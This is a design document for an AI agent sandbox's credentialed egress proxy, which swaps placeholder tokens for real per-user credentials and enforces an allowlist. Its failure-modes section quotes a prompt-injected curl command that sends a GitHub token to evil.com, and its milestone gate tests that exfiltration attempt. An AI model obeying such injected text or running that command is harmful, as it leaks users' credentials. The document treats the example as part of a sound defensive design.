# M13 Design: Generalized Credentialed Egress — non-MCP HTTP APIs

Version: 2.0 — June 19, 2026
Status: Design (approved for implementation planning). **Mechanism realized as a static single-tenant slice by [RC1 — AuthBridge egress control-plane PoC](2026-07-10-authbridge-egress-control-plane-poc-design.md)** (2026-07-14): RC1 implements the forward-proxy + baked-CA + header-swap mechanism (RC1 "Profile B") with a static credential. This spec is retained as the home of the deferred per-user / RFC 8693 token-exchange core.
Scope: How the sandbox reaches **any** HTTP API (GitHub, internal REST, arbitrary
allowlisted hosts) under the same zero-trust credential spine M10 established for MCP —
with per-user credentials resolved and injected **only at the egress proxy**, never held by
the harness, the sandbox, the prompt, or the log.
Milestone number: **M13 (provisional)** — a new sibling milestone extending the parent
roadmap's M7–M12. Adjust the number to fit the parent roadmap when slotted.
Parent design: [Zero-Trust, Multi-Agent Extensions to the MOCA](../../../docs/research/2026-06-18-zero-trust-multiagent-harness-extension.md) §2 spine, §3.2 sandbox egress, §4.1 invariants, M7–M9 credential plane
Sibling / specializes: [M10 — MCP via Code-Mode in the Sandbox](2026-06-18-m10-mcp-code-mode-design.md) — **M10's MCP-over-HTTP path becomes one interception case of this design.**
Builds on: M1 (Redis session backend), M2 (`K8sSandboxClient`), M3 (persistent channel), M4 (Knative wrapper), M10 (MCP code-mode + credential/identity model §5, placeholder-swap §5.3)

> **Relationship to M10.** M10 is frozen and approved. This design does not reopen it; it
> _generalizes the credential mechanism M10 already adopted_ — the **placeholder-swap** pattern
> (M10 §5.3) — to all HTTP egress. The selector, the resolvers, the audit producer, and the
> budget machinery are shared. Only the **interception point** differs: M10's in-mesh waypoint
> for in-mesh MCP backends; a **forward proxy** for external hosts.

> **Changelog 2.0 (supersedes v1.0).** v1.0 chose an in-mesh front-door + host-based injection
> (model sends no auth; proxy adds it) explicitly to _avoid_ TLS interception, at the cost of
> per-host mesh config, a generic egress helper, per-API wrappers for correctness, and an
> env-injection escape hatch for foreign binaries. v2.0 **pivots to AuthBridge's own
> placeholder-swap pattern over a forward proxy**: the sandbox/tools hold only inert
> placeholders, a forward proxy (`HTTPS_PROXY` + a baked CA) sees the request at L7 and
> overwrites the placeholder with the real resolved credential. This makes `gh`/`curl`/SDKs
> work **natively and unmodified**, collapses the front-door + correctness-wrappers apparatus,
> preserves full per-call L7 audit, and is more faithful to AuthBridge. The accepted cost is a
> baked CA (a trust anchor, not a secret) and one residual escape hatch for request-signing
> APIs (AWS SigV4). The selector and per-user stored-credential model are unchanged from v1.0.

---

## 1. Goal & scope

M10 settled one egress shape — MCP-over-HTTP to in-mesh kagenti backends — and proved the
spine on it: the model runs code in the sandbox that makes a credentialed call it cannot read,
using AuthBridge's **placeholder-swap** so the sandbox never holds a real secret. This
milestone answers the obvious next question: **what about everything else the model wants to
reach?** `gh`/the GitHub API, `curl` to an endpoint, code using an SDK against a service. The
driving requirement is **one unified mechanism** in which MCP is not special — it is the first
instance of "credentialed egress the sandbox can't read."

**The principle (inherited from M10, widened):** the model writes the code a human would —
`gh pr view`, `curl https://api.github.com/…`, an SDK call — using a credential that is, in the
sandbox, a **placeholder**. The egress proxy resolves `(bound subject ⊕ destination) →
credential`, **overwrites the placeholder with the real token at L7**, logs the call, and
enforces a cap. The sandbox, the prompt, and the log never see a real secret.

### Worked example (the shape of "done")

A user prompts: _"review the PR at https://github.com/kagenti/kagenti/pull/1990"_ — and knows
nothing about proxies, placeholders, or credentials.

1. The model maps intent → GitHub and writes a sandbox script the natural way, e.g.
   `gh pr view 1990 --repo kagenti/kagenti --json …` (or `curl https://api.github.com/repos/kagenti/kagenti/pulls/1990`).
   It uses `GH_TOKEN`, which in the sandbox is an **inert placeholder**.
2. The request egresses via `HTTPS_PROXY` → the AuthBridge forward proxy. The proxy terminates
   TLS (baked CA), sees `Authorization: Bearer <placeholder>` bound for api.github.com, resolves
   session → `subject = <user>`, host-policy → the user's stored GitHub grant, **overwrites** the
   header with the real token, originates real TLS to api.github.com, appends one audit entry,
   counts it.
3. GitHub sees the call **as that user**. The script filters/summarizes the diff _in code_ and
   prints only the review-relevant slice → one `tool_result`. A 3000-line PR never floods
   context — the filter-in-code token win, preserved.

### In scope

- **A forward egress proxy** (AuthBridge) the sandbox is configured to use (`HTTPS_PROXY`),
  with a **baked CA** in the sandbox trust store so it can read + rewrite L7 for external HTTPS.
- **Placeholder-swap for all egress credentials:** inert placeholders satisfy the client tool;
  the proxy overwrites per a per-destination **host-policy**, keyed on `(subject ⊕ destination)`.
- **Per-destination credential resolvers:** RFC 8693 **mint** (OAuth backends — the M10 path) or
  **fetch the user's stored grant** (non-exchangeable APIs like GitHub).
- **Egress allowlist** enforced at the proxy (host roster = allowlist = exfil boundary).
- **Generalized audit + budget:** per-call `egress-broker` log entries (full L7); hard
  per-session egress-call cap; soft turn-boundary budget widened to count them.
- **Recording** the per-user external-credential-store + linking/consent shape (§4) as a hard
  identity-plane dependency this milestone _consumes_, mirroring M10 §5.

### Out of scope (later milestones / separate tracks)

- **The per-user external-credential store + onboarding/consent build itself** — M7–M9
  identity-plane work. This design records its required shape; it does not build it.
- **Optional progressive-disclosure wrappers.** Native tools are first-class (§5); pre-baked
  per-API wrappers are a _later, optional_ token-optimization for very large API surfaces, not
  required for correctness. Not built here.
- **Request-signing APIs (AWS SigV4 and similar).** Where the secret _signs_ the request, a
  post-hoc header swap is impossible; these stay an env-inject-real-key escape hatch (§5.3),
  deferred.
- **Per-team / per-session host rosters.** Static per environment; deferred.
- **stdio-transport MCP** and **non-HTTP protocols.**
- **Subagent fan-out mechanics** — M11; this design only confirms composition (§7).

---

## 2. Key decisions

| #   | Decision                      | Choice                                                                                                                                                                                                                                                                                                                                                                             |
| --- | ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| E1  | Unification                   | **One credential mechanism across all egress; MCP is one interception case.** Shared selector, resolvers, placeholder-swap, audit producer, and budget. Interception differs only by locality: in-mesh waypoint (MCP/internal, M10) vs. forward proxy (external).                                                                                                                  |
| E2  | Credential presentation       | **Placeholder-swap (AuthBridge-native).** The sandbox/tool holds only an **inert placeholder**; the proxy overwrites it with the real resolved credential at egress. Tools use their native auth mechanism unchanged.                                                                                                                                                              |
| E3  | External interception         | **Forward proxy (`HTTPS_PROXY`) + baked CA** in the sandbox trust store. TLS interception is accepted and is the enabling mechanism. The CA is a **trust anchor, not a secret** (the proxy's private key never leaves the proxy).                                                                                                                                                  |
| E4  | Egress allowlist              | **Enforced at the proxy.** It forwards only to allowlisted hosts; the host roster is the allowlist and the exfil boundary. "curl to anywhere" is structurally impossible.                                                                                                                                                                                                          |
| E5  | Non-OAuth scoping             | **Per-user stored credentials. No shared-workload fallback.** Non-mintable destinations (GitHub PAT/App, third-party keys) resolve to the user's own pre-linked grant, keyed by bound subject.                                                                                                                                                                                     |
| E6  | Credential resolver           | **Two resolvers, one selector.** `(subject ⊕ destination)` resolves via **mint (RFC 8693)** for OAuth backends (M10 path) or **fetch-stored-grant** for everything else. The host-policy entry declares which, and which request field carries the credential.                                                                                                                     |
| E7  | Model interface               | **Native tools, first-class.** `gh`/`curl`/SDKs work unmodified using placeholder creds from env/config — the model writes the code a human would. Wrappers + a generic helper drop to **optional** token-optimization, not required for correctness or steering. The filter-in-code token win is preserved by code-mode regardless.                                               |
| E8  | Escape hatch                  | **Only request-signing schemes** (AWS SigV4 etc.), where the secret signs the request and cannot be swapped post-hoc, remain an env-inject-real-key escape hatch. Bearer/OAuth/header APIs (incl. GitHub) are first-class.                                                                                                                                                         |
| E9  | Security boundary             | **The forward proxy is the sole egress + enforcement point** — allowlist, resolve, overwrite, audit, cap. Sandbox code is fully bypass-capable and enforces nothing.                                                                                                                                                                                                               |
| E10 | Home                          | **New sibling milestone (this doc).** Keeps M10 frozen; records the new identity-plane dependency rather than entangling timelines.                                                                                                                                                                                                                                                |
| E11 | Placeholder semantics & exfil | **Placeholders are inert markers** that satisfy client tools. The proxy overwrites with the real credential **only for the matching allowlisted destination**, keyed on `(subject ⊕ destination)`. A placeholder sent anywhere else is never swapped and the host isn't reachable — so a leaked placeholder is worthless and a real credential never leaves its bound destination. |

---

## 3. Architecture & request path

```
user: "review PR https://github.com/kagenti/kagenti/pull/1990"   (knows nothing of egress)
  │
  ▼  model maps intent → GitHub; writes a NATURAL script in the sandbox
script:  gh pr view 1990 --repo kagenti/kagenti --json title,files,reviews
          │   (or: curl https://api.github.com/repos/kagenti/kagenti/pulls/1990)
          │   GH_TOKEN in the sandbox = an INERT PLACEHOLDER
          ▼  egress via HTTPS_PROXY
  AuthBridge forward proxy  (the broker)  — TLS-terminates via the baked CA
   • see request: Authorization: Bearer <placeholder>, Host = api.github.com
   • resolve session (X-Kagenti-Session / SPIFFE) → subject = <user>
   • host-policy[api.github.com] → resolver + credential field:
        - OAuth backend?  RFC 8693 mint        (M10 path)
        - else            fetch <user>'s STORED github grant, refresh if needed
   • OVERWRITE the credential field with the real token (placeholder-swap)
   • originate REAL TLS outward to api.github.com
   • append ONE per-call audit entry → session stream
        (data.via="egress-broker", host, method, path, subject, actor_spiffe_id)
   • increment per-session egress counter; reject past the hard cap
          │
          ▼  real api.github.com — enforces per-user authz on the injected token
script filters / summarizes the diff IN CODE, prints ONLY the review slice
          │
          ▼  returns as ONE tool_result to the model context     ← the token win
```

**Why this shape.** It reuses AuthBridge's existing placeholder-swap pattern (M10 §5.3) and
makes external APIs reachable with **zero special model behavior** — the model writes exactly
what a human would, because the credential it references is a placeholder the proxy fills in.
The two M10 token-win properties survive: tool/endpoint knowledge is the model's own (or
optional on-disk wrappers), and intermediate results are filtered in code so only the slice
enters context. The **forward proxy is the only security boundary** (E9): because the model
writes arbitrary code, nothing in the sandbox can constrain reachability — allowlist, per-user
resolution, overwrite, audit, and cap all live at the proxy.

**MCP stays M10.** In-mesh MCP backends keep M10's in-mesh waypoint interception (mesh mTLS, a
legitimate terminator — no CA needed there). M13 adds the _forward-proxy_ interception for
external hosts. Same brain (selector, resolvers, placeholder-swap, audit, cap), two
interception points by locality.

---

## 4. Credential & identity model

### 4.1 One selector, two resolvers (E6)

Every egress resolves `(bound subject ⊕ destination host) → credential` at the proxy. The
host-policy entry for the destination declares the resolver **and** which request field carries
the credential (e.g. `Authorization` header, bearer):

| Resolver            | When                                                                | How                                                                                    | Per-user?   |
| ------------------- | ------------------------------------------------------------------- | -------------------------------------------------------------------------------------- | ----------- |
| **Mint (RFC 8693)** | destination speaks OAuth (M10 MCP backends, OIDC APIs)              | actor = workload JWT-SVID, subject = `<user>`, audience = backend → fresh scoped token | yes, minted |
| **Stored grant**    | non-exchangeable API (GitHub PAT/App installation, third-party key) | fetch the user's pre-linked credential; refresh if supported                           | yes, stored |

The minting resolver is M10 §5 verbatim. The stored-grant resolver is the new capability and the
reason for the identity-plane dependency below.

### 4.2 Per-user stored credentials (E5) — the dependency this milestone records

Many useful APIs cannot mint a per-user token by exchange: a single shared key has no "Bob's
version." This design **does not** fall back to a shared workload credential (rejected — it
breaks per-user isolation). Instead it requires a **per-user external-credential store + a
one-time linking/consent flow**: the user links a destination once (OAuth authorize, or
registers a fine-grained PAT) → an offline grant lands in the identity plane, keyed
`(subject, destination)`.

Required properties of that store — recorded so the M7–M9 build inherits a settled shape (this
milestone **consumes**, does not build, the store):

- **At rest:** identity plane (Keycloak) + a K8s Secret loaded into the proxy sidecar's memory.
  **Never** in the harness or sandbox. (Spine §4.1.)
- **Selection:** by bound subject + destination. **Blast radius:** a compromised sandbox in a
  user's session can reach only **that user's** grants.
- **Lifecycle:** consent, rotation, expiry, revocation are first-class. On expiry/revoke the
  egress call returns an **auth error into the script** — **no silent fallback** to a
  workload-only or less-scoped credential.
- **Interactive vs. unattended are identical at egress.** GitHub login is not part of kagenti's
  Keycloak login, so even an online, interactive session reads the user's _stored_ grant — not a
  live propagated GitHub token. Unattended (scale-to-zero, user offline) reads the same grant.
  This subsumes M10's live-or-delegated subject sourcing.

### 4.3 Placeholder-swap mechanics (E2, E11)

- **Placeholders are provisioned into the sandbox** as ordinary tool config/env (`GH_TOKEN`,
  etc.) set to a recognizable inert value. They are **fake** — not secrets — so the model may
  read them freely, and they only exist to satisfy clients that refuse to send a request without
  a credential present. The harness can set them at bind time from the host-policy (no rebuild to
  add a bearer destination), or the image can ship standard placeholders.
- **The proxy overwrites, not merely fills.** Seeing the request at L7, the proxy replaces the
  credential field declared by the host-policy with the real resolved token, regardless of the
  placeholder's value. The sandbox's MCP/HTTP client never holds a usable secret.
- **The real credential is injected downstream of the log**, so no log entry, prompt, or sandbox
  surface carries it (invariant §4.1).

### 4.4 The session log carries identity references only

`subject` and `actor_spiffe_id` are identity references, never secrets. Injection happens
downstream of the log, at the proxy. The parent's red-team grep (log + harness env + sandbox env

- reconstructed prompt) remains the direct test.

---

## 5. Model-facing interface

**Native tools are first-class (E7).** The model writes the code a human would. `gh`, `curl`,
and SDKs run unmodified, reading placeholder credentials from their usual env/config. No helper,
no front-door hostname, no endpoint-override, no special convention. Real hostnames
(`api.github.com`) are used directly; `HTTPS_PROXY` routes egress to the broker transparently.

**The filter-in-code token win is preserved regardless.** Code-mode means the model's script
runs the tool, processes output _in code_, and prints only the relevant slice — so a huge PR
diff or API response never floods context. This holds whether the script uses `gh`, `curl`, or a
wrapper; it is a property of running tools inside a script, not of any wrapper.

**Optional wrappers (deferred, not required).** For a very large API surface where even
_discovering_ endpoints costs context, pre-baked `./apis/<service>/…` stubs can be added later as
a pure progressive-disclosure optimization. They are **not** needed for correctness or steering
under v2.0 (native tools already work), and they are **never** a security boundary (§5.1).

### 5.1 The proxy is the only boundary (E9)

The model writes arbitrary code; it can address any host, set any header, ignore any wrapper.
Therefore nothing in the sandbox constrains reachability or credentials. Enforcement is entirely
the proxy's: allowlist (which hosts), per-user resolution (whose credential), overwrite (the
sandbox never holds the secret), audit, and cap.

### 5.2 Why TLS interception here is acceptable (E3)

The forward proxy terminates TLS using a CA baked into the sandbox trust store. This is the
enabling mechanism, and its cost is bounded:

- **The CA is a trust anchor, not a secret.** The proxy's signing key stays in the proxy; a
  compromised sandbox gains nothing from possessing the public CA cert.
- **Realistic clients are unaffected.** `gh`, `curl`, boto3, the AWS CLI all use the system CA
  bundle (or honor `*_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS`); none pin by default. Certificate
  pinning is an exotic case; if a specific pinned client must be supported, route it around the
  proxy on a documented exception.
- **Audit improves.** Because the proxy sees full L7, per-call audit carries method + path, not
  just SNI.

### 5.3 Escape hatch — request-signing APIs (E8, deferred)

Where the credential **signs** the request (AWS SigV4 and similar), the signature is computed
from the secret, so a post-hoc header swap cannot work — the proxy would have to hold the secret
and re-sign. For these, the secret must reach the signer: an OpenShell-style credentials-driver
injects a short-lived per-user key into env, the SDK signs locally, and the proxy enforces
allowlist + audit (SNI-level) but does not swap. This is the **weaker** path (token in env,
coarser audit), narrowly scoped to signing schemes, resolved by the same `(subject ⊕
destination)` selector, and deferred until a real need lands. Bearer/OAuth/header APIs — the
common case, GitHub included — never touch it.

---

## 6. Observability, budget & failure modes

**Audit (generalize M10 D3).** The proxy is the log _producer_ for all egress; full L7 visibility
(it terminates TLS) means per-call entries carry method + path:

```
data.via          = "egress-broker"     // "mcp-waypoint" is a sub-case
data.host         = "api.github.com"
data.method/path  = "GET /repos/kagenti/kagenti/pulls/1990"
data.subject      = <user>              // identity reference
data.actor_spiffe_id = spiffe://…/sandbox
```

From Pi's view a script run is still one `intention` → one `tool_result`; fine-grained per-call
visibility lives in the session stream. Invariant §4.1 holds: no entry carries a raw secret —
the overwrite is downstream of the log.

**Budget (M10's "lean both," generalized).**

- **Hard cap (proxy):** a high per-session _egress-call_ ceiling — kill-switch for a runaway loop
  (the model writes a loop making thousands of calls inside one bash run, where no inference
  happens and the turn-boundary budget never sees it). A counter + one comparison on the audit
  path.
- **Soft budget (harness):** the existing M4-era turn-boundary voter, its cumulative sum widened
  to count broker-written egress entries → clean `abort`.

**Failure modes:**

- **Hard-cap hit** → the egress call fails _inside the model's script_; the model adapts mid-run.
- **Single-turn budget burn** → caught at the next turn boundary by the soft budget; pathological
  intra-turn loops caught by the hard cap.
- **Grant expired / revoked** → the resolver fails at the proxy; an auth error returns into the
  script. No silent fallback.
- **Destination off the allowlist** → the proxy refuses (no CONNECT/forward); reachability is
  bounded to the host roster (E4).
- **Placeholder misused (e.g. prompt-injected `curl evil.com -H "Authorization: Bearer $GH_TOKEN"`)**
  → triple-defended: `GH_TOKEN` is a fake placeholder; evil.com is not allowlisted (blocked); and
  even if it were, the proxy only swaps github creds for the github destination (E11). Nothing
  real leaks.

---

## 7. Subagents (composition check only — owned by M11)

Composes with subagents with no extra mechanism, as M10 §9: each subagent gets a fresh isolated
sandbox → its own SPIFFE id → its own proxy egress scope, its own per-session egress cap, and
resolution bound to its own `(actor SVID ⊕ subject)`. A subagent acting for the same user
inherits the parent's bound subject (optionally a down-scoped grant); a misbehaving subagent can
reach only its own scope's grants. Same image + placeholders, own identity. Nothing egress- or
credential-specific is added in M11 for this to hold.

---

## 8. Consequences & trade-offs (recorded honestly)

1. **New identity-plane state.** A per-user external-credential store with consent, linking,
   rotation, and revocation — larger than M10's delegation. A hard M7–M9 dependency; this
   milestone is blocked on it for its per-user, unattended gate (criterion 3).
2. **A baked CA + TLS interception.** Accepted (E3, §5.2): a trust anchor not a secret, realistic
   clients unaffected, audit improves. Cost: conceptual MITM of egress and a documented exception
   path for any genuinely cert-pinning client.
3. **Placeholder provisioning.** Each bearer destination needs a placeholder present in the
   sandbox (env/config). Lightweight (fake values, set at bind time from host-policy), but it is a
   provisioning step and a per-destination host-policy entry (resolver + credential field).
4. **Residual escape hatch for request-signing APIs.** AWS-SigV4-style schemes can't be swapped;
   they keep the weaker env-inject path (§5.3). Narrow and deferred.
5. **Richer L7 proxy on the critical path.** It now terminates TLS and rewrites arbitrary HTTP,
   not only MCP-over-HTTP. Mitigated by one shared codebase with M10 (MCP becomes a resolver +
   interception case, not a separate component).
6. **Relaxed isolation** (inherited from M10 §10.1). Untrusted backends are reachable through the
   mediating proxy rather than air-gapped; isolation comes from the proxy + NetworkPolicy + the
   bounded host roster. A terminating hop can be reintroduced for a specific high-risk backend
   without changing the model-facing behavior.

---

## 9. Milestone gate

M13 passes when, end to end on a Kind cluster with the sandbox image (baked CA + `HTTPS_PROXY` +
placeholders), the AuthBridge forward proxy, and the M7–M9 identity plane (including the per-user
external-credential store) deployed:

1. _"review PR 1990"_ completes purely by the model running a **native** sandbox script
   (`gh`/`curl`); `grep` confirms no real token is present in the harness bundle, sandbox env
   (placeholder only), or prompt.
2. The real GitHub credential is present **only** at the proxy: red-team grep finds it absent from
   harness env, sandbox env, prompt, and every session-log entry, while the call still succeeds as
   the prompting user; each call produced an `egress-broker` audit entry with method/path,
   `subject`, and `actor_spiffe_id`.
3. **Per-user, unattended:** two sessions bound to different subjects (bob, alice), with no live
   user token present, reach api.github.com with **distinct** stored grants; GitHub attributes
   bob's calls as bob and alice's as alice.
4. A deliberately runaway egress loop trips the hard cap (the call fails mid-script); a separate
   over-budget session ends via a clean turn-boundary `abort`.
5. A destination off the allowlist is refused; an expired/revoked grant surfaces an auth error
   into the script with **no silent fallback**.
6. **Exfil defense:** a prompt-injected attempt to send the GitHub placeholder to a non-github
   host fails — the host is blocked and/or no swap occurs; no real credential leaves its bound
   destination.
7. **Unification demonstrated:** an MCP call (in-mesh waypoint) and a GitHub call (forward proxy)
   share the same resolver/selector/placeholder-swap/audit logic, differing only in interception
   point and resolver.

---

## 10. References

- [Zero-Trust, Multi-Agent Extensions](../../../docs/research/2026-06-18-zero-trust-multiagent-harness-extension.md) — §2 spine, §3.2 sandbox egress, §4.1 invariants, M7–M9 credential plane.
- [M10 — MCP via Code-Mode in the Sandbox](2026-06-18-m10-mcp-code-mode-design.md) — the MCP path this design generalizes (§5 credential/identity model; **§5.3 placeholder-swap**, the pattern this design extends to all egress; §5.4 env-injection complement, now narrowed to signing-only; D3 audit producer; D4 budget).
- [M2 Design — K8sSandboxClient](2026-06-17-m2-k8s-sandbox-client-design.md) — Operations redirection to the pod (the path code-mode rides).
- [M4 Design — Knative Serverless Wrapper](2026-06-17-m4-knative-serverless-wrapper-design.md) — `runTurn`, the budget voter this design widens.
- kagenti AuthBridge — `kagenti-extensions/AuthBridge`: RFC 8693 token exchange, SPIFFE JWT-SVID client assertion, Keycloak; **the placeholder-swap design (`2026-06-02-credential-placeholder-swap-design.md`)** this milestone builds on; actor-token chaining noted unwired (the M7/M8 build).
- OpenShell credentials-keycloak — UDS gRPC credentials driver, env-injection pattern (now scoped to the request-signing escape hatch, §5.3).
- RFC 8693 — OAuth 2.0 Token Exchange (`subject_token`, `actor_token`, `audience`; §4.1 delegation chaining).
- Anthropic, "Code execution with MCP: building more efficient agents" (Nov 2025) — the filter-in-code + progressive-disclosure pattern this design extends beyond MCP.

---

_Assisted-By: Claude (Anthropic AI) <noreply@anthropic.com>_
